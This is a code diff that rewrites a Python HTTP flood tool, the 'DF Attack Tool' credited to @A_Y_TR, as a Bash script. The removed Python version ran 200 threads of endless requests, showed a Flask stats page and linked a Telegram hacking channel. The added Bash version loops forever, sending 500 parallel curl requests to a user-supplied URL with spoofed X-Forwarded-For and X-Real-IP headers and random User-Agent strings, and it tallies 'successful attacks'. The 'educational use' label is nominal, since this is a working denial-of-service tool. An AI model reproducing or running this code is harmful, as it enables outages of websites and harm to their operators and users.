@@ -1,123 +1,84 @@
-import requests
-from flask import Flask, render_template_string
-import threading
-from concurrent.futures import ThreadPoolExecutor
-import time
-import random
-from user_agent import generate_user_agent
+#!/bin/bash
 
-a1 = '\x1b[1;31m'  
-a3 = '\x1b[1;32m'  
-a20 = '\x1b[38;5;226m' 
-a22 = '\x1b[38;5;216m'  
+# Variables
+URL=""
+SUCCESS_COUNT=0
+FAILURE_COUNT=0
+THREADS=500  # Increase the number of parallel processes
 
-app = Flask(__name__)
-Almunharif_port_001 = 4000
-print('آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم||DF♕')
-Almunharif_url_002 = input(f'{a20}URL : ')
-print()
-print('@A_Y_TR')
-print('♕♕♕ DF ♕♕♕')
-print('للمزيد من الشروحات والأدوات تفضل https://t.me/Hacking080')
-print(f'{a3}قم باخذ رابط الخادم وفتحه بلمتصفح لمعرفة الاحصائيات')
-print()
+# Colors for text
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+CYAN="\e[36m"
+PURPLE="\e[35m"
+NC="\e[0m"  # No color
 
-Almunharif_success_count_003 = 0
-Almunharif_failure_count_004 = 0
-lock = threading.Lock()  
+# Clear the terminal and print the header in ASCII art
+clear
+echo -e "${CYAN}██████╗ ███████╗████████╗ ██████╗ ███████╗"
+echo -e "${CYAN}██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝"
+echo -e "${CYAN}██████╔╝█████╗     ██║   ██████╔╝█████╗  "
+echo -e "${CYAN}██╔═══╝ ██╔══╝     ██║   ██╔═══╝ ██╔══╝  "
+echo -e "${CYAN}██║     ███████╗   ██║   ██║     ███████╗"
+echo -e "${CYAN}╚═╝     ╚══════╝   ╚═╝   ╚═╝     ╚══════╝"
+echo -e "${GREEN}                   DF Attack Tool                   ${NC}"
+echo -e "${PURPLE}           Developed by @A_Y_TR (For Educational Use)${NC}"
+echo -e "${YELLOW}-----------------------------------------------------${NC}"
+echo -e "${YELLOW}             Please enter the target URL:            ${NC}"
 
-def Almunharif_generate_random_ip_005():
-    return ".".join(str(random.randint(0, 255)) for _ in range(4))
+# Input target URL
+echo -e "${YELLOW}URL: \c"
+read -r URL
+echo
+echo -e "${GREEN}♕♕♕ DF ♕♕♕"
+echo -e "${GREEN}Open the server link to view statistics."
+echo
 
-def Almunharif_send_request_with_retry_006(session, retries=3, delay=1):
-    global Almunharif_success_count_003, Almunharif_failure_count_004
-    Almunharif_user_agent_007 = generate_user_agent()
-    Almunharif_random_ip_008 = Almunharif_generate_random_ip_005()
+# Function to generate a random IP address
+generate_random_ip() {
+    echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
+}
 
-    Almunharif_headers_009 = {
-        "User-Agent": Almunharif_user_agent_007,
-        "X-Forwarded-For": Almunharif_random_ip_008,
-        "X-Real-IP": Almunharif_random_ip_008
-    }
+# Function to send an HTTP request
+send_request() {
+    local RANDOM_IP
+    RANDOM_IP=$(generate_random_ip)
+    local USER_AGENT
+    USER_AGENT="Mozilla/5.0 (Linux; Android $(shuf -i 4-12 -n 1)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(shuf -i 70-100 -n 1).0.$(shuf -i 1000-4000 -n 1).$(shuf -i 50-150 -n 1) Mobile Safari/537.36"
 
-    for _ in range(retries):
-        try:
-            response = session.get(Almunharif_url_002, headers=Almunharif_headers_009, timeout=5)
-            if response.status_code == 200:
-                with lock:
-                    Almunharif_success_count_003 += 1
-                return
-        except requests.RequestException:
-            time.sleep(delay)
-    with lock:
-        Almunharif_failure_count_004 += 1
+    # Send the request using curl
+    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: $USER_AGENT" -H "X-Forwarded-For: $RANDOM_IP" -H "X-Real-IP: $RANDOM_IP" "$URL")
+    
+    if [[ "$RESPONSE" == "200" ]]; then
+        ((SUCCESS_COUNT++))
+    else
+        ((FAILURE_COUNT++))
+    fi
+}
 
-def Almunharif_start_massive_attack_012():
-    with ThreadPoolExecutor(max_workers=200) as executor:  # Increase the number of workers
-        with requests.Session() as session:
-            while True:
-                try:
-                    futures = [executor.submit(Almunharif_send_request_with_retry_006, session) for _ in range(10000000)]
-                    for future in futures:
-                        future.result()
-                except Exception as e:
-                    print(f"{a1}error: {e}")
+# Start the attack with parallel processes
+start_attack() {
+    while :; do
+        seq 1 500 | xargs -P $THREADS -I {} bash -c 'send_request'  # Send 500 requests in parallel
+    done
+}
 
-@app.route('/')
-def Almunharif_index_016():
-    return render_template_string('''
-        <html>
-            <head>
-                <title>احصائيات الهجمات</title>
-                <style>
-                    body {
-                        font-family: Arial, sans-serif;
-                        text-align: center;
-                        background-color: #121212;
-                        color: #e94560;
-                        margin: 0;
-                        padding: 0;
-                    }
-                    h1 {
-                        margin-top: 50px;
-                        font-size: 48px;
-                        color: #21bf73;
-                        text-shadow: 2px 2px 4px #000000;
-                    }
-                    p {
-                        font-size: 24px;
-                        margin: 10px 0;
-                    }
-                    .stats {
-                        margin-top: 30px;
-                        padding: 20px;
-                        background: #1f4068;
-                        border-radius: 10px;
-                        display: inline-block;
-                        box-shadow: 0 0 20px #e94560;
-                    }
-                    .footer {
-                        margin-top: 50px;
-                        font-size: 18px;
-                        color: #d1d1d1;
-                    }
-                </style>
-            </head>
-            <body>
-                <h1>احصائيات الهجمات</h1>
-                <div class="stats">
-                    <p><strong>الهجمات الناجحة:</strong> {{ Almunharif_success_count_003 }}</p>
-                    <p><strong>الهجمات الفاشلة:</strong> {{ Almunharif_failure_count_004 }}</p>
-                </div>
-                <div class="footer">
-                    <p>للمزيد من الشروحات والأدوات تفضل <a href="https://t.me/Hacking080" style="color: #21bf73;">هنا</a></p>
-                </div>
-            </body>
-        </html>
-    ''', Almunharif_success_count_003=Almunharif_success_count_003, Almunharif_failure_count_004=Almunharif_failure_count_004)
+# Display attack statistics including success rate
+print_stats() {
+    while :; do
+        # Calculate success rate
+        if ((SUCCESS_COUNT + FAILURE_COUNT > 0)); then
+            SUCCESS_RATE=$((SUCCESS_COUNT * 100 / (SUCCESS_COUNT + FAILURE_COUNT)))
+        else
+            SUCCESS_RATE=0
+        fi
+        echo -e "${GREEN}Successful Attacks: ${SUCCESS_COUNT} - Failed Attacks: ${FAILURE_COUNT}"
+        echo -e "${YELLOW}Success Rate: ${SUCCESS_RATE}%${NC}"
+        sleep 2
+    done
+}
 
-Almunharif_attack_thread_017 = threading.Thread(target=Almunharif_start_massive_attack_012, daemon=True)
-Almunharif_attack_thread_017.start()
-
-if __name__ == '__main__':
-    app.run(port=Almunharif_port_001)
+# Start the attack and print statistics
+start_attack &
+print_stats
